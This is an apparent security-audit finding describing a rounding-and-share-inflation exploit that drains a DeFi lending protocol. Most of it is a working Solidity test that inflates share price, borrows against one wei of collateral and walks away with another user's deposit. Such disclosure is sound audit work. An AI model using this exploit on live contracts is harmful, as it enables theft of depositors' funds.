---
id: 25167
severity: "Crit/High"
---

# The Rounding Done in Protocol's Favor Can Be Weaponized to Drain the Protocol

## Description



## Proof of Concept

## Vulnerability Detail

- The attacker inflates the value of 1 share to a large value, making it sufficient to borrow all the borrowable assets using stealth donation as described in #1 using the original account.
- They create a throwAway account and mint 1 wei of share to that account as well.
- They put up this 1 wei of share as collateral, borrow all the available assets, and transfer them to the original account.
- Abandon the market by withdrawing only 1 wei of asset which is allowed, because 1 wei of asset won't be enough to make the position unhealthy (checked using `auditor.shortfall` at the start of the withdrawal). However, this results in 1 whole wei of share (worth a large value) being burnt due to rounding up. See #2.
- As a result, the throwaway account will now have 0 collateral and a lot of debt.
- The original account now has the claim to all the assets as they are the only holder of shares. Since the original account never borrowed, they are able to withdraw all the assets. Additionally, they receive all the borrowed assets that the throwaway account sent to it.

## Impact

- If the totalSupply of a market is 0, the whole protocol can be drained.

## Code Snippet

- [https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L726](<https://github.com/sherlock-audit/2024-04-interest-rate-model/blob/main/protocol/contracts/Market.sol#L726>)

##POC

- Add below testcase in `test/Market.t.sol`

```solidity
contract ThrowAwayAccount {
  function enterMarketAndBorrow(Market exactlyMarketToEnter, Market exactlyMarketToBorrowFrom) public {
    exactlyMarketToEnter.auditor().enterMarket(exactlyMarketToEnter);

    //borrow all the available assets
    exactlyMarketToBorrowFrom.borrow(3000 ether, msg.sender, address(this));

    //abandon the market by withdrawing only 1 wei of asset
    //this is allowed because 1 wei of asset won't be enough to make postion unhealthy (checked using auditor.shortfall at the start in withdraw)
    //but results in 1 whole wei of share (worth 8000 ether) being burnt due to rounding up
    exactlyMarketToEnter.withdraw(1, address(this), address(this));

    //This market will be underwater after that since the 1 wei they deposited as collateral has now been burnt
  }
}

 function testDrainProtocol() external {
    marketWETH.asset().transfer(BOB, 3000 ether);
    //this is the deposit that will be stolen later on
    vm.prank(BOB);
    marketWETH.deposit(3000 ether, BOB);

    //These are attacker's interactions that uses DAI market which has 0 totalSupply to drain the protocol (BOB's 3000 ether in this case)
    uint256 wETHBalanceBefore = marketWETH.asset().balanceOf(address(this));
    uint256 assetBalanceBefore = market.asset().balanceOf(address(this));
    //require that the total Supply is zero
    require(market.totalSupply() == 0, "totalSupply is not zero");

    //enter the market
    market.auditor().enterMarket(market);

    //make a small deposit
    market.deposit(0.01 ether, address(this));
    //borrow even smaller amount
    uint256 borrowShares = market.borrow(0.005 ether, address(this), address(this));

    //wait for 1 block which is enough so that atleast 1 wei is accured as interest
    vm.roll(block.number + 1);
    vm.warp(block.timestamp + 10 seconds);

    //deposit a few tokens to accure interest
    market.deposit(2, address(this));

    //repay all the debt
    market.refund(borrowShares, address(this));

    //redeem all but 1 wei of the deposit
    uint256 shares = market.balanceOf(address(this));
    market.redeem(shares - 1, address(this), address(this));

    require(market.totalAssets() == 2 && market.totalSupply() == 1, "starting conditions are not as expected");

    uint256 desiredPricePerShare = 8000 ether;
    // The loop to inflate the price
    while (true) {
      uint256 sharesReceived = market.deposit(market.totalAssets() * 2 - 1, address(this));
      require(sharesReceived == 1, "sharesReceived is not 1 as expected"); //this should have been 1.99999... for larger values of i but it is rounded down to 1

      if (market.totalAssets() > desiredPricePerShare) break;

      uint256 sharesBurnt = market.withdraw(1, address(this), address(this));
      require(sharesBurnt == 1, "sharesBunrt is not 1 as expected"); //this should have been ~0.0000001 for larger values of i but it is rounded up to 1
    }

    uint256 sharesBurnt = market.withdraw(market.totalAssets() - desiredPricePerShare, address(this), address(this));
    require(sharesBurnt == 1, "sharesBunrt is not 1 as expected");

    require(
      market.totalAssets() == desiredPricePerShare && market.totalSupply() == 1, "inflating the price was unsuccessful"
    );

    ThrowAwayAccount throwAwayAccount = new ThrowAwayAccount();

    //mint 1 wei of share (worth 8000 ether) to the throwaway account
    market.mint(1, address(throwAwayAccount));
    //throwAwayAccount puts up 1 wei of share as collateral, borrows all available assets and then withdraws 1 wei of asset
    throwAwayAccount.enterMarketAndBorrow(market, marketWETH);

    //this throwaway account now has a lot of debt and no collateral to back it
    (uint256 collateral, uint256 debt) = auditor.accountLiquidity(address(throwAwayAccount), Market(address(0)), 0);
    assertEq(collateral, 0);
    assertGt(debt, 3000 ether);

    //attacker gets away with everything
    market.withdraw(market.totalAssets(), address(this), address(this));

    assertEq(market.asset().balanceOf(address(this)), assetBalanceBefore - 1); //make sure attacker gets back all their assets
    //in addtion they get the borrowed assets for free
    assertEq(marketWETH.asset().balanceOf(address(this)), wETHBalanceBefore + 3000 ether);
  }
```

## Recommendation

- Fix #1 and #2
